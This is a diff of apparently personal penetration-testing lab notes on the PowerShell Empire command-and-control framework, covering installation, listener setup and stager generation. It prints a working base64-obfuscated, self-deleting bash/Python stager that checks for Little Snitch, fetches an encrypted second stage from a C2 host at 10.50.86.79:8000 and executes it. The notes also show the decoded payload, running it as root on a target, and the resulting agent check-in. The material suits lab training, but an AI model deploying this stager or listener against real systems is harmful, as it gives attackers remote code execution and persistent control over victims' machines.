@@ -1749,31 +1749,209 @@ Mandatory Label\High Mandatory Level                          Label            S
 
 </details>
 
-## 18. Command and Control - Introduction
+## 18. Command and Control - Introduction and Install
 
 <details>
   <summary>---</summary>
 
 ### Command and Control Framework (C2)
+
 - Used to consolidate attacker's position within a network
 - Simplify post-exploitation steps (privesc, AV evasion, pivoting, looting, covert network tactics etc.)
 - Eg. Cobalt Strike, Covenant (.NET), Merlin, Shadow, PoshC2, Powershell Empire (Windows)
 - C2 matrix to decide between the frameworks
   
 ### Powershell Empire
+
 - Windows target
 - Modules to take initial access to a network of Windows devices and turn into something substantial
 - GUI interface `Starkiller`
 - Current version Empire 3.x
 - Multiple people can connect and collaborate
 
-### Empire - Installation
+### Empire and Starkiller - Installation
 
-Install in the `/opt` directory
+- Install empire - `sudo apt install powershell-empire`
+- Run empire - `sudo powershell-empire --headless`
+- Install starkiller - `sudo apt install starkiller`
+- Run starkiller - `sudo starkiller`
+
+### Definitions
+
+- Listeners - listens for connection and help with exploitation
+- Stagers - payload generated for reverse shell. Deliver agents
+- Agents - similar to `session`
+- Modules - used with agents for further exploitation eg. dump hashes
+
+### Listeners
+
+- defaults to HTTP listener
+- single listeners can be used more than once
+
 ```
-sudo git clone https://github.com/BC-SECURITY/Empire/
-cd Empire && sudo ./setup/install.sh
+(Empire) > uselistener 
+dbx             http            http_com        http_foreign    http_hop        http_malleable  http_mapi       meterpreter     onedrive        redirector
+(Empire) > uselistener http
+(Empire: listeners/http) > info
+
+    Name: HTTP[S]
+Category: client_server
+
+Authors:
+  @harmj0y
+
+Description:
+  Starts a http[s] listener (PowerShell or Python) that uses a
+  GET/POST approach.
 ```
+
+Set variables and execute
+```
+(Empire: listeners/http) > set Name Webserver
+(Empire: listeners/http) > set Host 10.50.86.79
+(Empire: listeners/http) > set Port 8000
+(Empire: listeners/http) > execute
+[*] Starting listener 'Webserver'
+ * Serving Flask app "http" (lazy loading)
+ * Environment: production
+   WARNING: This is a development server. Do not use it in a production deployment.
+   Use a production WSGI server instead.
+ * Debug mode: off
+[+] Listener successfully started!
+(Empire: listeners/http) > 
+```
+
+We can resume listeners with `listeners`
+```
+(Empire) > listeners
+
+[*] Active listeners:
+
+  Name              Module          Host                                 Delay/Jitter   KillDate
+  ----              ------          ----                                 ------------   --------
+  Webserver         http            http://10.50.86.79:8000              5/0.0                   
+
+```
+
+### Stagers
+
+- Empire's payloads used to connect back to listeners
+- Stagers create agents when executed
+
+There are various stager options. A good one is `multi/launcher`
+
+```
+(Empire: listeners) > usestager 
+multi/bash                osx/application           osx/macro                 windows/bunny             windows/launcher_lnk      windows/shellcode
+multi/launcher            osx/ducky                 osx/pkg                   windows/csharp_exe        windows/launcher_sct      windows/teensy
+multi/macro               osx/dylib                 osx/safari_launcher       windows/dll               windows/launcher_vbs      windows/wmic
+multi/pyinstaller         osx/jar                   osx/shellcode             windows/ducky             windows/launcher_xml      
+multi/war                 osx/launcher              osx/teensy                windows/hta               windows/macro             
+osx/applescript           osx/macho                 windows/backdoorLnkMacro  windows/launcher_bat      windows/macroless_msword
+```
+
+Looking at `multi/bash`
+```
+(Empire: listeners) > usestager multi/bash
+(Empire: stager/multi/bash) > info
+
+Name: BashScript
+
+Description:
+  Generates self-deleting Bash script to execute the
+  Empire stage0 launcher.
+
+Options:
+
+  Name             Required    Value             Description
+  ----             --------    -------           -----------
+  Listener         True                          Listener to generate stager for.
+  Language         True        python            Language of the stager to generate.
+  OutFile          False                         File to output Bash script to, otherwise
+                                                 displayed on the screen.
+  SafeChecks       True        True              Switch. Checks for LittleSnitch or a
+                                                 SandBox, exit the staging process if
+                                                 true. Defaults to True.
+  UserAgent        False       default           User-agent string to use for the staging
+                                                 request (default, none, or other).
+  ScriptLogBypass  False       True              Include cobbr's Script Block Log Bypass
+                                                 in the stager code.
+  AMSIBypass       False       True              Include mattifestation's AMSI Bypass in
+                                                 the stager code.
+  AMSIBypass2      False       False             Include Tal Liberman's AMSI Bypass in
+                                                 the stager code.
+```
+
+We set the listener to our listenere `Webserver` and execute which creates stager in the `/tmp` directory
+```
+(Empire: stager/multi/bash) > set Listener Webserver
+(Empire: stager/multi/bash) > execute
+#!/bin/bash
+echo "import sys,base64,warnings;warnings.filterwarnings('ignore');exec(base64.b64decode('aW1wb3J0IHN5cztpbXBvcnQgcmUsIHN1YnByb2Nlc3M7Y21kID0gInBzIC1lZiB8IGdyZXAgTGl0dGxlXCBTbml0Y2ggfCBncmVwIC12IGdyZXAiCnBzID0gc3VicHJvY2Vzcy5Qb3BlbihjbWQsIHNoZWxsPVRydWUsIHN0ZG91dD1zdWJwcm9jZXNzLlBJUEUsIHN0ZGVycj1zdWJwcm9jZXNzLlBJUEUpCm91dCwgZXJyID0gcHMuY29tbXVuaWNhdGUoKQppZiByZS5zZWFyY2goIkxpdHRsZSBTbml0Y2giLCBvdXQuZGVjb2RlKCdVVEYtOCcpKToKICAgc3lzLmV4aXQoKQppbXBvcnQgdXJsbGliLnJlcXVlc3Q7ClVBPSdNb3ppbGxhLzUuMCAoV2luZG93cyBOVCA2LjE7IFdPVzY0OyBUcmlkZW50LzcuMDsgcnY6MTEuMCkgbGlrZSBHZWNrbyc7c2VydmVyPSdodHRwOi8vMTAuNTAuODYuNzk6ODAwMCc7dD0nL25ld3MucGhwJztyZXE9dXJsbGliLnJlcXVlc3QuUmVxdWVzdChzZXJ2ZXIrdCk7CnByb3h5ID0gdXJsbGliLnJlcXVlc3QuUHJveHlIYW5kbGVyKCk7Cm8gPSB1cmxsaWIucmVxdWVzdC5idWlsZF9vcGVuZXIocHJveHkpOwpvLmFkZGhlYWRlcnM9WygnVXNlci1BZ2VudCcsVUEpLCAoIkNvb2tpZSIsICJzZXNzaW9uPXZjbkJQMWxzU2NVY1NQWVkyVm14S2N5Qm4xST0iKV07CnVybGxpYi5yZXF1ZXN0Lmluc3RhbGxfb3BlbmVyKG8pOwphPXVybGxpYi5yZXF1ZXN0LnVybG9wZW4ocmVxKS5yZWFkKCk7CklWPWFbMDo0XTtkYXRhPWFbNDpdO2tleT1JVisndWE4d2g9bHBmXUJHZT83VG9Ec3FSQEVNfHJ5XkhfazknLmVuY29kZSgnVVRGLTgnKTtTLGosb3V0PWxpc3QocmFuZ2UoMjU2KSksMCxbXQpmb3IgaSBpbiBsaXN0KHJhbmdlKDI1NikpOgogICAgaj0oaitTW2ldK2tleVtpJWxlbihrZXkpXSklMjU2CiAgICBTW2ldLFNbal09U1tqXSxTW2ldCmk9aj0wCmZvciBjaGFyIGluIGRhdGE6CiAgICBpPShpKzEpJTI1NgogICAgaj0oaitTW2ldKSUyNTYKICAgIFNbaV0sU1tqXT1TW2pdLFNbaV0KICAgIG91dC5hcHBlbmQoY2hyKGNoYXJeU1soU1tpXStTW2pdKSUyNTZdKSkKZXhlYygnJy5qb2luKG91dCkp'));" | python3 &
+rm -f "$0"
+exit
+
+(Empire: stager/multi/bash) >
+```
+
+Base64 decoded
+```
+>  echo "aW1wb3J0IHN5cztpbXBvcnQgcmUsIHN1YnByb2Nlc3M7Y21kID0gInBzIC1lZiB8IGdyZXAgTGl0dGxlXCBTbml0Y2ggfCBncmVwIC12IGdyZXAiCnBzID0gc3VicHJvY2Vzcy5Qb3BlbihjbWQsIHNoZWxsPVRydWUsIHN0ZG91dD1zdWJwcm9jZXNzLlBJUEUsIHN0ZGVycj1zdWJwcm9jZXNzLlBJUEUpCm91dCwgZXJyID0gcHMuY29tbXVuaWNhdGUoKQppZiByZS5zZWFyY2goIkxpdHRsZSBTbml0Y2giLCBvdXQuZGVjb2RlKCdVVEYtOCcpKToKICAgc3lzLmV4aXQoKQppbXBvcnQgdXJsbGliLnJlcXVlc3Q7ClVBPSdNb3ppbGxhLzUuMCAoV2luZG93cyBOVCA2LjE7IFdPVzY0OyBUcmlkZW50LzcuMDsgcnY6MTEuMCkgbGlrZSBHZWNrbyc7c2VydmVyPSdodHRwOi8vMTAuNTAuODYuNzk6ODAwMCc7dD0nL25ld3MucGhwJztyZXE9dXJsbGliLnJlcXVlc3QuUmVxdWVzdChzZXJ2ZXIrdCk7CnByb3h5ID0gdXJsbGliLnJlcXVlc3QuUHJveHlIYW5kbGVyKCk7Cm8gPSB1cmxsaWIucmVxdWVzdC5idWlsZF9vcGVuZXIocHJveHkpOwpvLmFkZGhlYWRlcnM9WygnVXNlci1BZ2VudCcsVUEpLCAoIkNvb2tpZSIsICJzZXNzaW9uPXZjbkJQMWxzU2NVY1NQWVkyVm14S2N5Qm4xST0iKV07CnVybGxpYi5yZXF1ZXN0Lmluc3RhbGxfb3BlbmVyKG8pOwphPXVybGxpYi5yZXF1ZXN0LnVybG9wZW4ocmVxKS5yZWFkKCk7CklWPWFbMDo0XTtkYXRhPWFbNDpdO2tleT1JVisndWE4d2g9bHBmXUJHZT83VG9Ec3FSQEVNfHJ5XkhfazknLmVuY29kZSgnVVRGLTgnKTtTLGosb3V0PWxpc3QocmFuZ2UoMjU2KSksMCxbXQpmb3IgaSBpbiBsaXN0KHJhbmdlKDI1NikpOgogICAgaj0oaitTW2ldK2tleVtpJWxlbihrZXkpXSklMjU2CiAgICBTW2ldLFNbal09U1tqXSxTW2ldCmk9aj0wCmZvciBjaGFyIGluIGRhdGE6CiAgICBpPShpKzEpJTI1NgogICAgaj0oaitTW2ldKSUyNTYKICAgIFNbaV0sU1tqXT1TW2pdLFNbaV0KICAgIG91dC5hcHBlbmQoY2hyKGNoYXJeU1soU1tpXStTW2pdKSUyNTZdKSkKZXhlYygnJy5qb2luKG91dCkp" | base64 -d
+```
+
+```python
+import sys;import re, subprocess;cmd = "ps -ef | grep Little\ Snitch | grep -v grep"
+ps = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+out, err = ps.communicate()
+if re.search("Little Snitch", out.decode('UTF-8')):
+   sys.exit()
+import urllib.request;
+UA='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';server='http://10.50.86.79:8000';t='/news.php';req=urllib.request.Request(server+t);
+proxy = urllib.request.ProxyHandler();
+o = urllib.request.build_opener(proxy);
+o.addheaders=[('User-Agent',UA), ("Cookie", "session=vcnBP1lsScUcSPYY2VmxKcyBn1I=")];
+urllib.request.install_opener(o);
+a=urllib.request.urlopen(req).read();
+IV=a[0:4];data=a[4:];key=IV+'ua8wh=lpf]BGe?7ToDsqR@EM|ry^H_k9'.encode('UTF-8');S,j,out=list(range(256)),0,[]
+for i in list(range(256)):
+    j=(j+S[i]+key[i%len(key)])%256
+    S[i],S[j]=S[j],S[i]
+i=j=0
+for char in data:
+    i=(i+1)%256
+    j=(j+S[i])%256
+    S[i],S[j]=S[j],S[i]
+    out.append(chr(char^S[(S[i]+S[j])%256]))
+exec(''.join(out))%``
+
+```
+
+We can run the command on the target (webserver)
+```
+[root@prod-serv ~]# echo "import sys,base64,warnings;warnings.filterwarnings('ignore');exec(base64.b64decode('aW1wb3J0IHN5cztpbXBvcnQgcmUsIHN1YnByb2Nlc3M7Y21kID0gInBzIC1lZiB8IGdyZXAgTGl0dGxlXCBTbml0Y2ggfCBncmVwIC12IGdyZXAiCnBzID0gc3VicHJvY2Vzcy5Qb3BlbihjbWQsIHNoZWxsPVRydWUsIHN0ZG91dD1zdWJwcm9jZXNzLlBJUEUsIHN0ZGVycj1zdWJwcm9jZXNzLlBJUEUpCm91dCwgZXJyID0gcHMuY29tbXVuaWNhdGUoKQppZiByZS5zZWFyY2goIkxpdHRsZSBTbml0Y2giLCBvdXQuZGVjb2RlKCdVVEYtOCcpKToKICAgc3lzLmV4aXQoKQppbXBvcnQgdXJsbGliLnJlcXVlc3Q7ClVBPSdNb3ppbGxhLzUuMCAoV2luZG93cyBOVCA2LjE7IFdPVzY0OyBUcmlkZW50LzcuMDsgcnY6MTEuMCkgbGlrZSBHZWNrbyc7c2VydmVyPSdodHRwOi8vMTAuNTAuODYuNzk6ODAwMCc7dD0nL25ld3MucGhwJztyZXE9dXJsbGliLnJlcXVlc3QuUmVxdWVzdChzZXJ2ZXIrdCk7CnByb3h5ID0gdXJsbGliLnJlcXVlc3QuUHJveHlIYW5kbGVyKCk7Cm8gPSB1cmxsaWIucmVxdWVzdC5idWlsZF9vcGVuZXIocHJveHkpOwpvLmFkZGhlYWRlcnM9WygnVXNlci1BZ2VudCcsVUEpLCAoIkNvb2tpZSIsICJzZXNzaW9uPXZjbkJQMWxzU2NVY1NQWVkyVm14S2N5Qm4xST0iKV07CnVybGxpYi5yZXF1ZXN0Lmluc3RhbGxfb3BlbmVyKG8pOwphPXVybGxpYi5yZXF1ZXN0LnVybG9wZW4ocmVxKS5yZWFkKCk7CklWPWFbMDo0XTtkYXRhPWFbNDpdO2tleT1JVisndWE4d2g9bHBmXUJHZT83VG9Ec3FSQEVNfHJ5XkhfazknLmVuY29kZSgnVVRGLTgnKTtTLGosb3V0PWxpc3QocmFuZ2UoMjU2KSksMCxbXQpmb3IgaSBpbiBsaXN0KHJhbmdlKDI1NikpOgogICAgaj0oaitTW2ldK2tleVtpJWxlbihrZXkpXSklMjU2CiAgICBTW2ldLFNbal09U1tqXSxTW2ldCmk9aj0wCmZvciBjaGFyIGluIGRhdGE6CiAgICBpPShpKzEpJTI1NgogICAgaj0oaitTW2ldKSUyNTYKICAgIFNbaV0sU1tqXT1TW2pdLFNbaV0KICAgIG91dC5hcHBlbmQoY2hyKGNoYXJeU1soU1tpXStTW2pdKSUyNTZdKSkKZXhlYygnJy5qb2luKG91dCkp'));" | python3 &
+[1] 2166
+```
+
+And we get our agent
+
+(Empire: stager/multi/bash) > listeners
+
+[*] Active listeners:
+                                                                                                                                                                                                             
+  Name              Module          Host                                 Delay/Jitter   KillDate
+  ----              ------          ----                                 ------------   --------
+  Webserver         http            http://10.50.86.79:8000              5/0.0                      
+
+(Empire: listeners) > 
+[*] Sending PYTHON stager (stage 1) to 10.200.85.200                                                                                                                                                         
+[*] Agent XLNAM69P from 10.200.85.200 posted valid Python PUB key
+[*] New agent XLNAM69P checked in
+[+] Initial agent XLNAM69P from 10.200.85.200 now active (Slack)
+[*] Sending agent (stage 2) to XLNAM69P at 10.200.85.200
+[!] strip_python_comments is deprecated and should not be used
+```
+
+
 
 
 </details>
